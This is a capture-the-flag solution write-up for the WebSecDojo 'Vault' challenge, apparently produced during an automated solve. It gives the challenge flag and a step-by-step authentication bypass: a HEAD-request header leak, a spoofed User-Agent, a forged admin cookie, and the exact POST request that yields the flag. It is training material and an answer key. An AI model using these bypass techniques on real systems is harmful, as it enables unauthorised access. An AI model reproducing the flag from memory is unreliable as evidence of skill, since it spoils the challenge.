# WebSecDojo Vault Challenge Solution

## Flag
```
flag#B4nk5Ar3c00l!
```

## Vulnerability
The challenge requires a multi-step authentication bypass:

1. **HTTP Method-based Information Disclosure**: The hint "Don't get aHEAD of yourself" indicates using the HEAD method. A HEAD request reveals a custom header `banker-agent-access: You need to be Agent33` that is not present in GET requests.

2. **User-Agent Authentication**: Setting `User-Agent: Agent33` bypasses the initial access control, revealing a second authentication phase.

3. **Cookie-based Authentication**: The page loads `static/js/cookie.js` which checks for a cookie named `admins` with value `btoa(CryptoJS.MD5("true").toString())`. The correct value is `YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=`.

4. **Header-based Password Disclosure**: After providing the correct cookie, the server returns `bank-access-code: 1573!` header, which is the password for the final step.

5. **Form Submission**: POSTing the password `1573!` reveals the flag.

## Exact Request that Exercised the Vulnerability

The final request that revealed the flag:

```
POST /vault/ HTTP/1.1
Host: websecdojo.com
User-Agent: Agent33
Cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=
Content-Type: application/x-www-form-urlencoded

password=1573!
```

## h5i Message IDs

| ID | Description |
|----|-------------|
| req_3 / res_3 | HEAD request revealing `banker-agent-access: You need to be Agent33` header |
| req_8 / res_8 | HEAD with `User-Agent: Agent33` - authentication successful (no banker-agent-access header in response) |
| req_9 / res_9 | GET with `User-Agent: Agent33` - shows Agent33 authenticated page |
| req_10 / res_10 | GET with correct cookie - reveals `bank-access-code: 1573!` header |
| req_11 / res_11 | POST with password `1573!` - reveals flag `flag#B4nk5Ar3c00l!` |

## Session
- Browser session: `br_bs52tr`
- Target: https://websecdojo.com/vault/
